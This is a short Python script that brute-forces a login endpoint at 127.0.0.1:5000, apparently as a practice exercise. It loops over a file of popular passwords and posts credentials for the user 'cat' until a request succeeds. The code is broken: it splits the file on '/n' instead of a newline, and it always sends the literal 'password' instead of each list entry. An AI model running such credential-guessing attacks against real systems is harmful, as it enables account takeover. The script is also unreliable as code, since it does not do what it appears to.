import requests


with open('popular_passwords.txt') as f:
    passwords = f.read().split('/n')


for password in passwords:
    print(password)
    response = requests.post('http://127.0.0.1:5000/auth',
                             json={'login': 'cat', 'password': 'password'})
    if response.status_code == 200:
        print('Success!')
        break
